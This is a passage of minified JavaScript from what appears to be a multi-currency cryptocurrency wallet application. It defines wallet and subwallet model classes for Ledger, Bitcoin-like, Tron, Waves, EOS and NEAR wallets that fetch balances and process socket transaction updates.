                            var a;
                            return (null === (a = t.data.smartContract) || void 0 === a ? void 0 : a.toLowerCase()) === e
                        }
                        ));
                        if (void 0 === l)
                            throw "foundSubWallet is undefined";
                        t.amount = (0,
                        d.hC)(t.amount, 10 ** (null !== (r = l.data.precision) && void 0 !== r ? r : NaN)).toString();
                        t.currencyFrom = l.data.currency;
                        t.currencyTo = l.data.currency;
                        t.isIncoming = this._isTxIsIncoming(t);
                        this.repeatFetchBalance(this);
                        return {
                            tx: t,
                            shouldUpdateWallet: !1
                        }
                    } catch (t) {
                        g.error("_handleSocketIncomingTokenTx failed", e, t);
                        return {
                            tx: null,
                            shouldUpdateWallet: !1
                        }
                    }
                }
                ));
                _defineProperty(this, "_handleSocketIncomingTokenTxConfirmation", (async e => {
                    try {
                        var t, a, n;
                        const r = {
                            ...e
                        };
                        let l = !1;
                        const s = null === (t = r.extra) || void 0 === t || null === (a = t.contract) || void 0 === a ? void 0 : a.toLowerCase();
                        let i = this.subWallets.find((e => {
                            var t;
                            return (null === (t = e.data.smartContract) || void 0 === t ? void 0 : t.toLowerCase()) === s
                        }
                        ));
                        if (!i && s) {
                            l = await (0,
                            p.Z)((async () => {
                                const e = await this.fetchAndAddTokenSubwallet(s, r);
                                if (!e)
                                    throw Error();
                                return e
                            }
                            ), {
                                attempts: 25,
                                delay: 500
                            });
                            i = this.subWallets.find((e => {
                                var t;
                                return (null === (t = e.data.smartContract) || void 0 === t ? void 0 : t.toLowerCase()) === s
                            }
                            ))
                        }
                        if (!i)
                            throw new Error("Can't fetch subwallet");
                        r.currencyFrom = i.data.currency;
                        r.currencyTo = i.data.currency;
                        r.amount = (0,
                        d.hC)(r.amount, 10 ** (null !== (n = i.data.precision) && void 0 !== n ? n : NaN)).toString();
                        if (r.isError)
                            this._isTxIsIncoming(r) || this.repeatFetchBalance(this);
                        else {
                            this.repeatFetchBalance(i);
                            this._isTxIsIncoming(r) || this.repeatFetchBalance(this)
                        }
                        r.isIncoming = this._isTxIsIncoming(r);
                        return {
                            tx: r,
                            shouldUpdateWallet: l
                        }
                    } catch (t) {
                        g.error("_handleSocketIncomingTokenTxConfirmation failed", e, t);
                        return {
                            tx: null,
                            shouldUpdateWallet: !1
                        }
                    }
                }
                ))
            }
        }
    }
    ,
    6723: (e, t, a) => {
        "use strict";
        a.d(t, {
            b: () => SubwalletsFetchableCommonWalletModel
        });
        var n = a(57640)
          , r = a.n(n)
          , l = a(9924)
          , s = a.n(l)
          , i = a(31672)
          , o = a.n(i)
          , c = a(2490)
          , u = a.n(c)
          , d = a(59461)
          , m = a.n(d)
          , p = a(41817)
          , f = a.n(p)
          , E = a(17995)
          , h = a(12587)
          , g = a(45152)
          , y = a(98148);
        function _defineProperty(e, t, a) {
            (t = _toPropertyKey(t))in e ? Object.defineProperty(e, t, {
                value: a,
                enumerable: !0,
                configurable: !0,
                writable: !0
            }) : e[t] = a;
            return e
        }
        function _toPropertyKey(e) {
            var t = _toPrimitive(e, "string");
            return "symbol" == typeof t ? t : String(t)
        }
        function _toPrimitive(e, t) {
            if ("object" != typeof e || null === e)
                return e;
            var a = e[Symbol.toPrimitive];
            if (void 0 !== a) {
                var n = a.call(e, t || "default");
                if ("object" != typeof n)
                    return n;
                throw new TypeError("@@toPrimitive must return a primitive value.")
            }
            return ("string" === t ? String : Number)(e)
        }
        const v = h.P.create({
            name: "subwallets-fechable"
        });
        class SubwalletsFetchableCommonWalletModel extends g.Z {
            constructor() {
                super(...arguments);
                _defineProperty(this, "fetchSubWallets", (async () => {
                    let e;
                    e = E.Z.hasLightAdapterByWallet(this.data) ? await E.Z.loadLightAdapterByWallet(this.data) : await E.Z.getApiByWallet(this.data);
                    if (e && e.fetchTokenWallets)
                        try {
                            let t = (0,
                            y.k)(await e.fetchTokenWallets(this.data));
                            this.data.watchOnly && (t = t.map((e => {
                                e.watchOnly = this.data.watchOnly;
                                return e
                            }
                            )));
                            let a = !1;
                            for (const e of t) {
                                const t = undefined;
                                if (!this.subWallets.find((t => this.areSubWalletsEqual(t, e)))) {
                                    await this.addSubWallet(e);
                                    a = !0
                                }
                            }
                            return a
                        } catch (e) {
                            v.error(`${this.data.currency} failed`, e)
                        }
                    return !1
                }
                ))
            }
        }
    }
    ,
    91482: (e, t, a) => {
        "use strict";
        a.d(t, {
            ND: () => me,
            ZP: () => ModelManager
        });
        var n = a(12587)
          , r = a(41817)
          , l = a(65811)
          , s = a(18913)
          , i = a(35830)
          , o = a(6723)
          , c = a(45152)
          , u = a(17995)
          , d = a(67048);
        function _defineProperty(e, t, a) {
            (t = _toPropertyKey(t))in e ? Object.defineProperty(e, t, {
                value: a,
                enumerable: !0,
                configurable: !0,
                writable: !0
            }) : e[t] = a;
            return e
        }
        function _toPropertyKey(e) {
            var t = _toPrimitive(e, "string");
            return "symbol" == typeof t ? t : String(t)
        }
        function _toPrimitive(e, t) {
            if ("object" != typeof e || null === e)
                return e;
            var a = e[Symbol.toPrimitive];
            if (void 0 !== a) {
                var n = a.call(e, t || "default");
                if ("object" != typeof n)
                    return n;
                throw new TypeError("@@toPrimitive must return a primitive value.")
            }
            return ("string" === t ? String : Number)(e)
        }
        class AdaShelleyWalletModel extends o.b {
            constructor() {
                super();
                _defineProperty(this, "SubWalletModel", i.Z);
                _defineProperty(this, "areSubWalletsEqual", ( (e, t) => (0,
                s.Z)(e.smartContract) === (0,
                s.Z)(t.smartContract)));
                _defineProperty(this, "getClass", ( () => AdaShelleyWalletModel));
                _defineProperty(this, "fetchBalance", (async () => {
                    const e = await this._getBalanceByLightAdapter();
                    if ((0,
                    c.Q)(e))
                        return e;
                    throw new Error("Failed to fetchBalance balance")
                }
                ));
                _defineProperty(this, "_getBalanceByLightAdapter", (async e => {
                    try {
                        const t = await u.Z.loadLightAdapterByWallet(this.data);
                        if (null == t || !t.getBalanceByAddress)
                            throw new Error("Light adapter or getBalanceByAddress method is not available");
                        const a = await t.getBalanceByAddress({
                            ...this.data,
                            address: e || this.data.address
                        });
                        if (!(0,
                        c.Q)(null == a ? void 0 : a.minimalBalance))
                            throw new Error(`Invalid minimal balance received: ${null == a ? void 0 : a.minimalBalance}`);
                        this.data.minimalBalance = a.minimalBalance;
                        if ((0,
                        c.Q)(null == a ? void 0 : a.balance))
                            return a.balance;
                        throw new Error(`Invalid balance received: ${null == a ? void 0 : a.balance}`)
                    } catch (e) {
                        throw e
                    }
                }
                ));
                _defineProperty(this, "_getBalanceByMainApi", (async (e, t) => {
                    try {
                        const a = await u.Z.getApiByWallet(this.data);
                        if (null == a || !a.getBalanceByAddress)
                            throw new Error("API or getBalanceByAddress method is not available");
                        const n = await a.getBalanceByAddress({
                            ...this.data,
                            address: e || this.data.address,
                            privateKey: t || this.data.privateKey
                        });
                        if (!(0,
                        c.Q)(null == n ? void 0 : n.minimalBalance))
                            throw new Error(`Invalid minimal balance received: ${null == n ? void 0 : n.minimalBalance}`);
                        this.data.minimalBalance = n.minimalBalance;
                        if ((0,
                        c.Q)(null == n ? void 0 : n.balance))
                            return n.balance;
                        throw new Error(`Invalid balance received: ${null == n ? void 0 : n.balance}`)
                    } catch (e) {
                        throw e
                    }
                }
                ));
                _defineProperty(this, "getAvailableBalance", (async () => {
                    try {
                        return this.data.minimalBalance && isFinite(+this.data.minimalBalance) ? (0,
                        d.h9)(this.balance, this.data.minimalBalance).toString() : this.balance
                    } catch (e) {
                        throw new Error("Failed to calculate available balance")
                    }
                }
                ));
                this.type = l.uQ.ADA_SHELLEY_WALLET
            }
        }
        var m = a(42155)
          , p = a(52084)
          , f = a(64183);
        function subwallet_defineProperty(e, t, a) {
            (t = subwallet_toPropertyKey(t))in e ? Object.defineProperty(e, t, {
                value: a,
                enumerable: !0,
                configurable: !0,
                writable: !0
            }) : e[t] = a;
            return e
        }
        function subwallet_toPropertyKey(e) {
            var t = subwallet_toPrimitive(e, "string");
            return "symbol" == typeof t ? t : String(t)
        }
        function subwallet_toPrimitive(e, t) {
            if ("object" != typeof e || null === e)
                return e;
            var a = e[Symbol.toPrimitive];
            if (void 0 !== a) {
                var n = a.call(e, t || "default");
                if ("object" != typeof n)
                    return n;
                throw new TypeError("@@toPrimitive must return a primitive value.")
            }
            return ("string" === t ? String : Number)(e)
        }
        class BnbLedgerSubWalletModel extends c.Z {
            constructor() {
                super();
                subwallet_defineProperty(this, "SubWalletModel", f.n);
                subwallet_defineProperty(this, "isUpdatableBySocket", !0);
                this.type = l.aO.BNB_TOKEN_SUBWALLET;
                this.subWalletsHidden = !0;
                this.hw = l.Vw.LEDGER;
                this.isSubWallet = !0
            }
        }
        function bnb_defineProperty(e, t, a) {
            (t = bnb_toPropertyKey(t))in e ? Object.defineProperty(e, t, {
                value: a,
                enumerable: !0,
                configurable: !0,
                writable: !0
            }) : e[t] = a;
            return e
        }
        function bnb_toPropertyKey(e) {
            var t = bnb_toPrimitive(e, "string");
            return "symbol" == typeof t ? t : String(t)
        }
        function bnb_toPrimitive(e, t) {
            if ("object" != typeof e || null === e)
                return e;
            var a = e[Symbol.toPrimitive];
            if (void 0 !== a) {
                var n = a.call(e, t || "default");
                if ("object" != typeof n)
                    return n;
                throw new TypeError("@@toPrimitive must return a primitive value.")
            }
            return ("string" === t ? String : Number)(e)
        }
        class BnbLedgerWalletModel extends p.Z {
            constructor() {
                super();
                bnb_defineProperty(this, "SubWalletModel", BnbLedgerSubWalletModel);
                bnb_defineProperty(this, "isUpdatableBySocket", !0);
                bnb_defineProperty(this, "isSocketUniqInstance", !0);
                bnb_defineProperty(this, "_createInstance", (async e => {
                    let {address: t, derivePath: a, currency: n, family: r, title: l, balance: s} = e;
                    Object.assign(this.data, {
                        family: r,
                        address: t,
                        currency: n,
                        derivePath: a,
                        title: l,
                        uuid: (0,
                        m.Z)().slice(0, 8),
                        balance: s
                    });
                    return this
                }
                ));
                this.type = l.uQ.BNB_WALLET;
                this.subWalletsHidden = !1;
                this.hw = l.Vw.LEDGER
            }
        }
        var E = a(31672)
          , h = a(2490)
          , g = a(59461)
          , y = a(87205)
          , v = a(69509);
        function eth_subwallet_defineProperty(e, t, a) {
            (t = eth_subwallet_toPropertyKey(t))in e ? Object.defineProperty(e, t, {
                value: a,
                enumerable: !0,
                configurable: !0,
                writable: !0
            }) : e[t] = a;
            return e
        }
        function eth_subwallet_toPropertyKey(e) {
            var t = eth_subwallet_toPrimitive(e, "string");
            return "symbol" == typeof t ? t : String(t)
        }
        function eth_subwallet_toPrimitive(e, t) {
            if ("object" != typeof e || null === e)
                return e;
            var a = e[Symbol.toPrimitive];
            if (void 0 !== a) {
                var n = a.call(e, t || "default");
                if ("object" != typeof n)
                    return n;
                throw new TypeError("@@toPrimitive must return a primitive value.")
            }
            return ("string" === t ? String : Number)(e)
        }
        class HwEthLikeSubWalletModel extends c.Z {
            constructor() {
                super();
                eth_subwallet_defineProperty(this, "SubWalletModel", f.n);
                eth_subwallet_defineProperty(this, "_createInstance", (async e => {
                    let {address: t, derivePath: a, currency: n, family: r} = e;
                    Object.assign(this.data, {
                        family: r,
                        address: t,
                        currency: n,
                        derivePath: a,
                        uuid: (0,
                        m.Z)().slice(0, 8),
                        balance: "0"
                    });
                    return this
                }
                ));
                this.type = l.aO.SEGWIT_SUBWALLET;
                this.subWalletsHidden = !0;
                this.hw = l.Vw.LEDGER;
                this.isSubWallet = !0
            }
        }
        var _ = a(85641);
        function eth_defineProperty(e, t, a) {
            (t = eth_toPropertyKey(t))in e ? Object.defineProperty(e, t, {
                value: a,
                enumerable: !0,
                configurable: !0,
                writable: !0
            }) : e[t] = a;
            return e
        }
        function eth_toPropertyKey(e) {
            var t = eth_toPrimitive(e, "string");
            return "symbol" == typeof t ? t : String(t)
        }
        function eth_toPrimitive(e, t) {
            if ("object" != typeof e || null === e)
                return e;
            var a = e[Symbol.toPrimitive];
            if (void 0 !== a) {
                var n = a.call(e, t || "default");
                if ("object" != typeof n)
                    return n;
                throw new TypeError("@@toPrimitive must return a primitive value.")
            }
            return ("string" === t ? String : Number)(e)
        }
        const w = n.P.create({
            name: "model-ledger-eth"
        });
        class EthLikeLedgerWalletModel extends _.J {
            constructor() {
                super();
                eth_defineProperty(this, "SubWalletModel", HwEthLikeSubWalletModel);
                eth_defineProperty(this, "areSubWalletsEqual", ( (e, t) => (0,
                y.t)(e.smartContract) === (0,
                y.t)(t.smartContract)));
                eth_defineProperty(this, "_createInstance", (async e => {
                    let {address: t, derivePath: a, currency: n, title: r, balance: s} = e;
                    try {
                        Object.assign(this.data, {
                            title: r,
                            address: t,
                            currency: n,
                            uuid: (0,
                            m.Z)().slice(0, 8),
                            balance: s || "0",
                            hw: l.Vw.LEDGER,
                            derivePath: a
                        });
                        return this
                    } catch (e) {
                        w.error("_createInstance failed (ledger)", e);
                        throw e
                    }
                }
                ));
                this.type = l.uQ.ETH_LIKE_LEDGER_WALLET;
                this.hw = l.Vw.LEDGER;
                this.subWalletsHidden = !1;
                this.data.subWalletsHidden = !1
            }
            async addSubWallet(e) {
                var t;
                let a = arguments.length > 1 && void 0 !== arguments[1] && arguments[1];
                const n = null === (t = this.subWallets) || void 0 === t ? void 0 : t.find((t => this.areSubWalletsEqual(t, e)));
                if (n)
                    return n;
                Object.assign(e, {
                    family: this.data.currency
                });
                let r;
                r = e instanceof v.Z || e && e.updateBalance ? e : await (new this.SubWalletModel).recoverFromPlainObject(e);
                r.derivePath = this.data.derivePath || this.data.config.derivePath;
                this.subWallets.push(r);
                a && await this.updateBalance();
                return r
            }
        }
        var b = a(85827)
          , k = a(25387)
          , S = a(72608)
          , C = a(15581)
          , N = a(34514)
          , T = a(57640)
          , A = a(9924)
          , x = a(9710);
        function btc_subwallet_defineProperty(e, t, a) {
            (t = btc_subwallet_toPropertyKey(t))in e ? Object.defineProperty(e, t, {
                value: a,
                enumerable: !0,
                configurable: !0,
                writable: !0
            }) : e[t] = a;
            return e
        }
        function btc_subwallet_toPropertyKey(e) {
            var t = btc_subwallet_toPrimitive(e, "string");
            return "symbol" == typeof t ? t : String(t)
        }
        function btc_subwallet_toPrimitive(e, t) {
            if ("object" != typeof e || null === e)
                return e;
            var a = e[Symbol.toPrimitive];
            if (void 0 !== a) {
                var n = a.call(e, t || "default");
                if ("object" != typeof n)
                    return n;
                throw new TypeError("@@toPrimitive must return a primitive value.")
            }
            return ("string" === t ? String : Number)(e)
        }
        class BtcLikeSegwitSubWalletModel extends c.Z {
            constructor() {
                super();
                btc_subwallet_defineProperty(this, "SubWalletModel", f.n);
                btc_subwallet_defineProperty(this, "_createInstance", (async e => {
                    let {address: t, derivePath: a, currency: n, family: r} = e;
                    Object.assign(this.data, {
                        family: r,
                        address: t,
                        currency: n,
                        derivePath: a,
                        uuid: (0,
                        m.Z)().slice(0, 8),
                        balance: "0"
                    });
                    return this
                }
                ));
                btc_subwallet_defineProperty(this, "_recoverInstance", (e => {
                    this.data = {
                        ...this.data,
                        ...e,
                        uuid: e.uuid ? e.uuid : (0,
                        m.Z)().slice(0, 8)
                    };
                    delete this.data.subWallets;
                    return this
                }
                ));
                this.type = l.aO.SEGWIT_SUBWALLET;
                this.subWalletsHidden = !0;
                this.hw = l.Vw.LEDGER
            }
        }
        function btc_defineProperty(e, t, a) {
            (t = btc_toPropertyKey(t))in e ? Object.defineProperty(e, t, {
                value: a,
                enumerable: !0,
                configurable: !0,
                writable: !0
            }) : e[t] = a;
            return e
        }
        function btc_toPropertyKey(e) {
            var t = btc_toPrimitive(e, "string");
            return "symbol" == typeof t ? t : String(t)
        }
        function btc_toPrimitive(e, t) {
            if ("object" != typeof e || null === e)
                return e;
            var a = e[Symbol.toPrimitive];
            if (void 0 !== a) {
                var n = a.call(e, t || "default");
                if ("object" != typeof n)
                    return n;
                throw new TypeError("@@toPrimitive must return a primitive value.")
            }
            return ("string" === t ? String : Number)(e)
        }
        const I = n.P.create({
            name: "model-segwit-btc"
        });
        class BtcLikeSegwitWalletModel extends c.Z {
            constructor() {
                super();
                btc_defineProperty(this, "SubWalletModel", BtcLikeSegwitSubWalletModel);
                btc_defineProperty(this, "updateBalance", (async () => {
                    try {
                        if (this.subWallets && Array.isArray(this.subWallets)) {
                            for (const e of this.subWallets)
                                await e.updateBalance();
                            let e = this.subWallets.reduce(( (e, t) => (0,
                            d.PD)(e, t.data.balance).toString()), "0");
                            e && (e = e.toString());
                            e !== this.data.balance && (this.data.balance = e.toString())
                        }
                    } catch (e) {
                        I.error(`updateBalance failed (ledger) ${this.data.currency}`, e)
                    }
                    if (this.storeManager) {
                        this.storeManager.updateBalance(this);
                        this.storeManager.setWalletBalanceWasUpdatedByRest(this.data.uuid)
                    } else
                        I.error("this.storeManager is null", this)
                }
                ));
                btc_defineProperty(this, "compileSocketManagerSubscrParams", ( () => {
                    const e = {};
                    this.subWallets.forEach((t => {
                        e[t.address] = this.data.currency
                    }
                    ));
                    return e
                }
                ));
                btc_defineProperty(this, "isTxRalatesTo", ( (e, t) => {
                    var a;
                    let n = !1;
                    if ((null === (a = t.currencyFrom) || void 0 === a ? void 0 : a.toLowerCase()) !== this.data.currency)
                        return !1;
                    this.subWallets.forEach((t => {
                        e.toLowerCase() === t.data.address.toLowerCase() && (n = !0)
                    }
                    ));
                    return n
                }
                ));
                btc_defineProperty(this, "handleSocketIncomingTx", (async e => {
                    let {tx: t} = e;
                    const a = {
                        ...t
                    };
                    let n = !1;
                    this.subWallets.forEach((e => {
                        e.data.address === a.addressTo && (n = !0)
                    }
                    ));
                    let r = "";
                    if (n) {
                        r = a.addressTo;
                        a.addressTo = this.data.title
                    } else {
                        r = a.addressFrom;
                        a.extra = a.extra || {};
                        a.extra.fromWalletUuid = this.data.uuid;
                        a.addressFrom = this.data.title
                    }
                    a.isIncoming = n;
                    const l = this.subWallets.find((e => e.address === r));
                    l && this.repeatFetchBalance(l);
                    const s = this.subWallets.reduce(( (e, t) => (0,
                    d.PD)(e, t.data.balance).toString()), "0");
                    s && (this.balance = s);
                    if (this.storeManager) {
                        x.n.sendTxNotification({
                            tx: a,
                            wallet: this,
                            isFromSocket: !0
                        });
                        await this.storeManager.updateTransactions(this, [a])
                    } else
                        I.error("this.storeManager is null", this)
                }
                ));
                btc_defineProperty(this, "handleSocketIncomingTxConfirmation", (async e => {
                    let {tx: t} = e;
                    try {
                        const e = {
                            ...t
                        };
                        let a = !1;
                        this.subWallets.forEach((t => {
                            t.data.address === e.addressTo && (a = !0)
                        }
                        ));
                        if (a)
                            e.addressTo = this.data.title;
                        else {
                            e.extra = e.extra || {};
                            e.extra.fromWalletUuid = this.data.uuid;
                            e.addressFrom = this.data.title
                        }
                        +e.confirmations <= 0 && (e.confirmations = "1");
                        e.isIncoming = a;
                        e.status = "success";
                        this.repeatFetchBalance(this);
                        const n = this.subWallets.reduce(( (e, t) => (0,
                        d.PD)(e, t.data.balance).toString()), "0");
                        n && (this.balance = n);
                        if (this.storeManager) {
                            x.n.sendTxNotification({
                                tx: e,
                                wallet: this,
                                isFromSocket: !0
                            });
                            await this.storeManager.updateTransactions(this, [e])
                        } else
                            I.error("this.storeManager is null", this)
                    } catch (e) {
                        I.error(`handleSocketIncomingTxConfirmation failed (ledger) ${this.data.currency}`, e)
                    }
                }
                ));
                btc_defineProperty(this, "getFromAddress", ( () => this.subWallets.map((e => e.data.address))));
                btc_defineProperty(this, "updateTransactions", (async () => {
                    try {
                        let e = [];
                        const t = [];
                        let a = [];
                        if (this.subWallets && Array.isArray(this.subWallets)) {
                            for (const a of this.subWallets) {
                                const n = await a._fetchTransactions();
                                if (n) {
                                    t.push(a.data.address);
                                    e = e.concat(n)
                                }
                            }
                            const n = [];
                            e.forEach((e => {
                                var a, r;
                                n.find((t => t.hash === e.hash)) || t.includes(null !== (a = e.addressTo) && void 0 !== a ? a : "undefined") && t.includes(null !== (r = e.addressFrom) && void 0 !== r ? r : "undefined") || n.push(e)
                            }
                            ));
                            a = n.map((e => {
                                if (e.isIncoming)
                                    e.addressTo = this.data.title;
                                else {
                                    e.extra = e.extra || {};
                                    e.extra.fromWalletUuid = this.data.uuid;
                                    e.addressFrom = this.data.title
                                }
                                return e
                            }
                            ))
                        }
                        if (this.storeManager) {
                            x.n.sendTxsNotifications({
                                txs: a,
                                wallet: this,
                                isFromSocket: !1
                            });
                            this.storeManager.updateTransactions(this, a);
                            this.isNeedUpdateTransactions && (this.isNeedUpdateTransactions = !1)
                        } else
                            I.error("this.storeManager is null", this)
                    } catch (e) {
                        I.error(`updateTransactions failed (ledger) ${this.data.currency}`, e)
                    }
                }
                ));
                btc_defineProperty(this, "_createInstance", (async e => {
                    let {currency: t, address: a, subWallets: n, title: r, balance: s} = e;
                    try {
                        Object.assign(this.data, {
                            title: r,
                            address: a,
                            currency: t,
                            uuid: (0,
                            m.Z)().slice(0, 8),
                            balance: s || "0",
                            hw: l.Vw.LEDGER
                        });
                        this.subWallets = await this._createSubwallets(null != n ? n : []);
                        await this.updateBalance();
                        return this
                    } catch (e) {
                        I.error(`_createInstance failed (ledger) ${this.data.currency}`, e);
                        throw e
                    }
                }
                ));
                this.type = l.uQ.BTC_LIKE_SEGWIT_WALLET;
                this.subWalletsHidden = !0;
                this.hw = l.Vw.LEDGER
            }
        }
        var P = a(64211)
          , L = a(41874);
        function wallet_btc_defineProperty(e, t, a) {
            (t = wallet_btc_toPropertyKey(t))in e ? Object.defineProperty(e, t, {
                value: a,
                enumerable: !0,
                configurable: !0,
                writable: !0
            }) : e[t] = a;
            return e
        }
        function wallet_btc_toPropertyKey(e) {
            var t = wallet_btc_toPrimitive(e, "string");
            return "symbol" == typeof t ? t : String(t)
        }
        function wallet_btc_toPrimitive(e, t) {
            if ("object" != typeof e || null === e)
                return e;
            var a = e[Symbol.toPrimitive];
            if (void 0 !== a) {
                var n = a.call(e, t || "default");
                if ("object" != typeof n)
                    return n;
                throw new TypeError("@@toPrimitive must return a primitive value.")
            }
            return ("string" === t ? String : Number)(e)
        }
        class BtcLikeWalletModel extends c.Z {
            constructor() {
                super();
                wallet_btc_defineProperty(this, "SubWalletModel", f.n);
                wallet_btc_defineProperty(this, "checkUtxos", (async e => {
                    let {addressTo: t, amount: a, feePerByte: n, fee: r} = e;
                    const l = await u.Z.getApiByWallet(this.data)
                      , s = await l.getDustThreshold()
                      , i = (0,
                    d.eq)(a, this.data.balance) || (0,
                    d.eq)((0,
                    d.PD)(a, r), this.data.balance)
                      , o = (0,
                    d.eq)(a, this.data.balance) ? (0,
                    d.h9)(a, r).toString() : a
                      , existsNonEmpty = e => "string" == typeof e && e.length > 0
                      , c = await l.prepareTx({
                        addressFrom: this.data.address,
                        addressTo: t,
                        amount: o,
                        isAllIn: i,
                        feePerByte: n
                    })
                      , m = {
                        isNoValid: !1,
                        isDustRemaining: !1
                    };
                    null != c && c.outputs && (m.isDustRemaining = c.outputs.some((e => e.value < s)));
                    existsNonEmpty(t) && existsNonEmpty(a) && void 0 === (null == c ? void 0 : c.inputs) && (m.isNoValid = !0);
                    return m
                }
                ));
                this.type = l.uQ.BTC_LIKE_WALLET;
                this.subWalletsHidden = !0
            }
        }
        function bch_defineProperty(e, t, a) {
            (t = bch_toPropertyKey(t))in e ? Object.defineProperty(e, t, {
                value: a,
                enumerable: !0,
                configurable: !0,
                writable: !0
            }) : e[t] = a;
            return e
        }
        function bch_toPropertyKey(e) {
            var t = bch_toPrimitive(e, "string");
            return "symbol" == typeof t ? t : String(t)
        }
        function bch_toPrimitive(e, t) {
            if ("object" != typeof e || null === e)
                return e;
            var a = e[Symbol.toPrimitive];
            if (void 0 !== a) {
                var n = a.call(e, t || "default");
                if ("object" != typeof n)
                    return n;
                throw new TypeError("@@toPrimitive must return a primitive value.")
            }
            return ("string" === t ? String : Number)(e)
        }
        class BchWalletModel extends BtcLikeWalletModel {
            constructor() {
                super(...arguments);
                bch_defineProperty(this, "create", (async e => {
                    try {
                        const t = await this._createInstance(e);
                        this.initializeDataGettersAndSetters();
                        const a = undefined
                          , n = (await u.Z.getApiByWallet(this)).toConvertAddress({
                            address: this.address,
                            type: "legacy"
                        });
                        n && (this.legacyAddress = n);
                        return t
                    } catch (e) {
                        throw e
                    }
                }
                ))
            }
        }
        var F = a(47799)
          , W = a(70888);
        function eos_defineProperty(e, t, a) {
            (t = eos_toPropertyKey(t))in e ? Object.defineProperty(e, t, {
                value: a,
                enumerable: !0,
                configurable: !0,
                writable: !0
            }) : e[t] = a;
            return e
        }
        function eos_toPropertyKey(e) {
            var t = eos_toPrimitive(e, "string");
            return "symbol" == typeof t ? t : String(t)
        }
        function eos_toPrimitive(e, t) {
            if ("object" != typeof e || null === e)
                return e;
            var a = e[Symbol.toPrimitive];
            if (void 0 !== a) {
                var n = a.call(e, t || "default");
                if ("object" != typeof n)
                    return n;
                throw new TypeError("@@toPrimitive must return a primitive value.")
            }
            return ("string" === t ? String : Number)(e)
        }
        class EosWalletModel extends o.b {
            constructor() {
                super();
                eos_defineProperty(this, "SubWalletModel", i.Z);
                eos_defineProperty(this, "areSubWalletsEqual", ( (e, t) => (0,
                s.Z)(e.currency) === (0,
                s.Z)(t.currency)));
                eos_defineProperty(this, "getClass", ( () => EosWalletModel));
                this.type = l.uQ.EOS_WALLET
            }
        }
        var R = a(86239)
          , B = a(18600);
        const O = 21;
        function trx_subwallet_defineProperty(e, t, a) {
            (t = trx_subwallet_toPropertyKey(t))in e ? Object.defineProperty(e, t, {
                value: a,
                enumerable: !0,
                configurable: !0,
                writable: !0
            }) : e[t] = a;
            return e
        }
        function trx_subwallet_toPropertyKey(e) {
            var t = trx_subwallet_toPrimitive(e, "string");
            return "symbol" == typeof t ? t : String(t)
        }
        function trx_subwallet_toPrimitive(e, t) {
            if ("object" != typeof e || null === e)
                return e;
            var a = e[Symbol.toPrimitive];
            if (void 0 !== a) {
                var n = a.call(e, t || "default");
                if ("object" != typeof n)
                    return n;
                throw new TypeError("@@toPrimitive must return a primitive value.")
            }
            return ("string" === t ? String : Number)(e)
        }
        const D = B.Ph.create({
            name: "tron-subwallet-model"
        });
        class TronSubWalletModel extends i.Z {
            constructor() {
                super();
                trx_subwallet_defineProperty(this, "SubWalletModel", f.n);
                trx_subwallet_defineProperty(this, "_recoverInstance", (e => {
                    try {
                        const t = e.smartContract || this.data.smartContract || "";
                        this.data = {
                            ...this.data,
                            ...e,
                            uuid: e.uuid || this.data.uuid || (0,
                            m.Z)().slice(0, 8),
                            adapterType: t.length > O ? R.L.token : R.L.main,
                            adapterTicker: "trx"
                        };
                        return this
                    } catch (t) {
                        D.error(`_recoverInstance failed ${e}`, t);
                        return this
                    }
                }
                ));
                this.type = l.aO.TRON_TOKEN_SUBWALLET
            }
        }
        function trx_defineProperty(e, t, a) {
            (t = trx_toPropertyKey(t))in e ? Object.defineProperty(e, t, {
                value: a,
                enumerable: !0,
                configurable: !0,
                writable: !0
            }) : e[t] = a;
            return e
        }
        function trx_toPropertyKey(e) {
            var t = trx_toPrimitive(e, "string");
            return "symbol" == typeof t ? t : String(t)
        }
        function trx_toPrimitive(e, t) {
            if ("object" != typeof e || null === e)
                return e;
            var a = e[Symbol.toPrimitive];
            if (void 0 !== a) {
                var n = a.call(e, t || "default");
                if ("object" != typeof n)
                    return n;
                throw new TypeError("@@toPrimitive must return a primitive value.")
            }
            return ("string" === t ? String : Number)(e)
        }
        class TrxWalletModel extends o.b {
            constructor() {
                super();
                trx_defineProperty(this, "SubWalletModel", TronSubWalletModel);
                trx_defineProperty(this, "areSubWalletsEqual", ( (e, t) => (0,
                s.Z)(e.currency) === (0,
                s.Z)(t.currency)));
                trx_defineProperty(this, "getClass", ( () => TrxWalletModel));
                this.data = {
                    currency: "",
                    balance: "",
                    account: "",
                    type: l.uQ.TRX_WALLET,
                    address: "",
                    title: "",
                    uuid: "",
                    privateKey: ""
                }
            }
        }
        function waves_defineProperty(e, t, a) {
            (t = waves_toPropertyKey(t))in e ? Object.defineProperty(e, t, {
                value: a,
                enumerable: !0,
                configurable: !0,
                writable: !0
            }) : e[t] = a;
            return e
        }
        function waves_toPropertyKey(e) {
            var t = waves_toPrimitive(e, "string");
            return "symbol" == typeof t ? t : String(t)
        }
        function waves_toPrimitive(e, t) {
            if ("object" != typeof e || null === e)
                return e;
            var a = e[Symbol.toPrimitive];
            if (void 0 !== a) {
                var n = a.call(e, t || "default");
                if ("object" != typeof n)
                    return n;
                throw new TypeError("@@toPrimitive must return a primitive value.")
            }
            return ("string" === t ? String : Number)(e)
        }
        class WavesWalletModel extends o.b {
            constructor() {
                super();
                waves_defineProperty(this, "SubWalletModel", i.Z);
                waves_defineProperty(this, "areSubWalletsEqual", ( (e, t) => (0,
                s.Z)(e.currency) === (0,
                s.Z)(t.currency)));
                waves_defineProperty(this, "getClass", ( () => WavesWalletModel));
                this.type = l.uQ.WAVES_WALLET
            }
        }
        var M = a(90702)
          , U = a(74315);
        function near_defineProperty(e, t, a) {
            (t = near_toPropertyKey(t))in e ? Object.defineProperty(e, t, {
                value: a,
                enumerable: !0,
                configurable: !0,
                writable: !0
            }) : e[t] = a;
            return e
        }
        function near_toPropertyKey(e) {
            var t = near_toPrimitive(e, "string");
            return "symbol" == typeof t ? t : String(t)
        }
        function near_toPrimitive(e, t) {
            if ("object" != typeof e || null === e)
                return e;
            var a = e[Symbol.toPrimitive];
            if (void 0 !== a) {
                var n = a.call(e, t || "default");
                if ("object" != typeof n)
                    return n;
                throw new TypeError("@@toPrimitive must return a primitive value.")
            }
            return ("string" === t ? String : Number)(e)
        }
        const G = n.P.create({
            name: "near-wallet-model"
        });
        class NearWalletModel extends c.Z {
            constructor() {
                super();
                near_defineProperty(this, "SubWalletModel", i.Z);
                near_defineProperty(this, "_getBalanceByMainApi", (async (e, t) => {
                    try {
                        const a = await u.Z.getApiByWallet(this.data);
